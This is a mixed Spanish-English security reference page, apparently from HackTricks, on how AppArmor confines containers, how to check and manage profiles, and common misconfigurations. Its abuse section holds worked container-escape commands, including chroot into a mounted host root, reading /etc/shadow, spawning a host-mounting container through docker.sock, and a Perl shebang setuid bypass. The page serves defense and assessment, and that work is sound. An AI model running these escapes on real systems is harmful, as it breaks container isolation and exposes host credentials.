# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

AppArmor es un sistema de **Control de Acceso Obligatorio** que aplica restricciones mediante perfiles por programa. A diferencia de las comprobaciones tradicionales de DAC, que dependen en gran medida de la propiedad por usuario y grupo, AppArmor permite que el kernel haga cumplir una política asociada al propio proceso. En entornos de contenedores, esto importa porque una carga de trabajo puede tener suficientes privilegios tradicionales para intentar una acción y aun así ser denegada porque su perfil de AppArmor no permite la ruta, el mount, el comportamiento de red o el uso de capabilities correspondiente.

El punto conceptual más importante es que AppArmor es **basado en rutas**. Evalúa el acceso al sistema de archivos mediante reglas de ruta en lugar de mediante etiquetas, como hace SELinux. Eso lo hace accesible y potente, pero también significa que los bind mounts y los diseños de rutas alternativos merecen atención cuidadosa. Si el mismo contenido del host se vuelve accesible desde una ruta diferente, el efecto de la política puede no ser el que el operador esperaba originalmente.

## Papel en el aislamiento de contenedores

Las revisiones de seguridad de contenedores a menudo se detienen en capabilities y seccomp, pero AppArmor sigue siendo importante después de esas comprobaciones. Imagínese un contenedor que tiene más privilegios de los que debería, o una carga de trabajo que necesitó una capability adicional por razones operativas. AppArmor todavía puede restringir el acceso a archivos, el comportamiento de mount, la red y los patrones de ejecución de formas que detengan la vía de abuso evidente. Por eso deshabilitar AppArmor "solo para que la aplicación funcione" puede transformar silenciosamente una configuración meramente arriesgada en una que sea activamente explotable.

## Laboratorio

Para comprobar si AppArmor está activo en el host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver con qué usuario/identidad se está ejecutando el proceso actual del contenedor:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La diferencia es instructiva. En el caso normal, el proceso debería mostrar un contexto AppArmor vinculado al perfil elegido por el runtime. En el caso unconfined, esa capa extra de restricciones desaparece.

También puedes inspeccionar qué piensa Docker que aplicó:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker can apply a default or custom AppArmor profile when the host supports it. Podman can also integrate with AppArmor on AppArmor-based systems, although on SELinux-first distributions the other MAC system often takes center stage. Kubernetes can expose AppArmor policy at the workload level on nodes that actually support AppArmor. LXC and related Ubuntu-family system-container environments also use AppArmor extensively.

The practical point is that AppArmor is not a "Docker feature". It is a host-kernel feature that several runtimes can choose to apply. If the host does not support it or the runtime is told to run unconfined, the supposed protection is not really there.

On Docker-capable AppArmor hosts, the best-known default is `docker-default`. That profile is generated from Moby's AppArmor template and is important because it explains why some capability-based PoCs still fail in a default container. In broad terms, `docker-default` allows ordinary networking, denies writes to much of `/proc`, denies access to sensitive parts of `/sys`, blocks mount operations, and restricts ptrace so that it is not a general host-probing primitive. Understanding that baseline helps distinguish "the container has `CAP_SYS_ADMIN`" from "the container can actually use that capability against the kernel interfaces I care about".

## Profile Management

AppArmor profiles are usually stored under `/etc/apparmor.d/`. A common naming convention is to replace slashes in the executable path with dots. For example, a profile for `/usr/bin/man` is commonly stored as `/etc/apparmor.d/usr.bin.man`. This detail matters during both defense and assessment because once you know the active profile name, you can often locate the corresponding file quickly on the host.

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La razón por la que estos comandos importan en una referencia de container-security es que explican cómo se construyen realmente los perfiles, se cargan, se cambian a complain mode y se modifican después de cambios en la aplicación. Si un operador tiene la costumbre de poner los perfiles en complain mode durante la resolución de problemas y olvida restaurar enforcement, el contenedor puede parecer protegido en la documentación mientras en la realidad se comporta de forma mucho más laxa.

### Construcción y actualización de perfiles

`aa-genprof` puede observar el comportamiento de la aplicación y ayudar a generar un perfil de forma interactiva:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` puede generar un perfil de plantilla que luego puede cargarse con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Cuando el binario cambia y la política necesita actualizarse, `aa-logprof` puede reproducir las denegaciones encontradas en los logs y ayudar al operador a decidir si permitirlas o denegarlas:
```bash
sudo aa-logprof
```
### Registros

Las denegaciones de AppArmor suelen ser visibles a través de `auditd`, syslog o herramientas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Esto es útil tanto operativa como ofensivamente. Los defensores lo usan para refinar perfiles. Los atacantes lo usan para averiguar qué ruta u operación exacta está siendo denegada y si AppArmor es el control que bloquea una cadena de explotación.

### Identifying The Exact Profile File

Cuando un runtime muestra un nombre de perfil de AppArmor específico para un container, a menudo es útil mapear ese nombre de nuevo al archivo de perfil en el disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Esto es especialmente útil durante la revisión desde el host porque cierra la brecha entre "el contenedor dice que se está ejecutando bajo el perfil `lowpriv`" y "las reglas reales viven en este archivo específico que puede auditarse o recargarse".

## Misconfiguraciones

El error más obvio es `apparmor=unconfined`. Los administradores a menudo lo configuran mientras depuran una aplicación que falló porque el perfil bloqueó correctamente algo peligroso o inesperado. Si la opción permanece en producción, la capa MAC completa se ha eliminado efectivamente.

Otro problema sutil es asumir que bind mounts son inofensivos porque los permisos de archivo parecen normales. Dado que AppArmor es path-based, exponer rutas del host bajo ubicaciones de montaje alternativas puede interactuar mal con las reglas de rutas. Un tercer error es olvidar que un nombre de perfil en un archivo de configuración significa muy poco si el kernel del host no está realmente haciendo cumplir AppArmor.

## Abuso

Cuando AppArmor no está presente, operaciones que antes estaban restringidas pueden funcionar de repente: leer rutas sensibles a través de bind mounts, acceder a partes de procfs o sysfs que deberían seguir siendo más difíciles de usar, realizar acciones relacionadas con mounts si capabilities/seccomp también lo permiten, o usar rutas que un perfil normalmente denegaría. AppArmor suele ser el mecanismo que explica por qué un intento de breakout basado en capabilities "should work" en el papel pero aún falla en la práctica. Quita AppArmor, y el mismo intento puede empezar a tener éxito.

Si sospechas que AppArmor es lo principal que impide una cadena de abuso path-traversal, bind-mount, o mount-based, el primer paso suele ser comparar qué se vuelve accesible con y sin un perfil. Por ejemplo, si una ruta del host está montada dentro del contenedor, empieza comprobando si puedes recorrerla y leerla:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si el contenedor también tiene una capability peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas es comprobar si AppArmor es el control que bloquea las operaciones de mount o el acceso a kernel filesystems sensibles:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
En entornos donde un host path ya está disponible mediante un bind mount, perder AppArmor también puede convertir un problema de information-disclosure de solo lectura en acceso directo a archivos del host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
El objetivo de estos comandos no es que AppArmor por sí solo provoque el breakout. Se trata de que, una vez que AppArmor se elimina, muchos vectores de abuso basados en el sistema de archivos y en montajes pueden probarse de inmediato.

### Ejemplo completo: AppArmor deshabilitado + Host Root montado

Si el contenedor ya tiene el host root bind-mounted en `/host`, eliminar AppArmor puede convertir un camino de abuso del sistema de archivos que estaba bloqueado en un complete host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una vez que el shell se está ejecutando a través del host filesystem, la workload se ha escapado efectivamente del container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Ejemplo completo: AppArmor deshabilitado + Runtime Socket

Si la verdadera barrera era AppArmor en torno al estado runtime, un socket montado puede ser suficiente para un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
La ruta exacta depende del punto de montaje, pero el resultado final es el mismo: AppArmor ya no evita el acceso a la API de runtime, y la API de runtime puede lanzar un contenedor que compromete al host.

### Ejemplo completo: Path-Based Bind-Mount Bypass

Porque AppArmor está basado en rutas, proteger `/proc/**` no protege automáticamente el mismo contenido de procfs del host cuando es accesible a través de una ruta diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
El impacto depende de qué exactamente esté montado y de si la ruta alternativa también elude otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con el mount layout en lugar de de forma aislada.

### Ejemplo completo: Shebang Bypass

Las políticas de AppArmor a veces apuntan a una ruta del interpreter de manera que no contemplan completamente la ejecución de scripts mediante el manejo de shebang. Un ejemplo histórico consistió en usar un script cuya primera línea apunta a un interpreter confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de ejemplo es importante como recordatorio de que la intención del profile y la semántica real de ejecución pueden divergir. Al revisar AppArmor en entornos container, las interpreter chains y las alternate execution paths merecen especial atención.

## Comprobaciones

El objetivo de estas comprobaciones es responder rápidamente tres preguntas: ¿está AppArmor habilitado en el host, está el proceso actual confinado y aplicó realmente el runtime un profile a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Lo interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, la carga de trabajo no se beneficia del confinamiento de AppArmor.
- Si `aa-status` muestra AppArmor deshabilitado o no cargado, cualquier nombre de perfil en la configuración de runtime es en su mayoría cosmético.
- Si `docker inspect` muestra `unconfined` o un perfil personalizado inesperado, eso suele ser la razón por la que un vector de abuso basado en el sistema de archivos o en montajes funciona.

Si un contenedor ya tiene privilegios elevados por razones operativas, dejar AppArmor habilitado a menudo marca la diferencia entre una excepción controlada y una falla de seguridad mucho más amplia.

## Runtime Defaults

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por defecto en hosts con soporte para AppArmor | Usa el perfil `docker-default` de AppArmor a menos que se sobrescriba | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende del host | AppArmor es compatible mediante `--security-opt`, pero el valor predeterminado exacto depende del host/runtime y es menos universal que el perfil `docker-default` documentado de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predeterminado condicional | Si `appArmorProfile.type` no está especificado, el valor por defecto es `RuntimeDefault`, pero solo se aplica cuando AppArmor está habilitado en el nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un perfil débil, nodos sin soporte de AppArmor |
| containerd / CRI-O under Kubernetes | Sigue el soporte del nodo/runtime | Los runtimes comúnmente soportados por Kubernetes soportan AppArmor, pero la aplicación real aún depende del soporte del nodo y de la configuración de la carga de trabajo | Igual que la fila de Kubernetes; la configuración directa del runtime también puede omitir AppArmor por completo |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Un ajuste de perfil en un manifiesto no crea confinamiento en un nodo donde AppArmor no está habilitado.
{{#include ../../../../banners/hacktricks-training.md}}
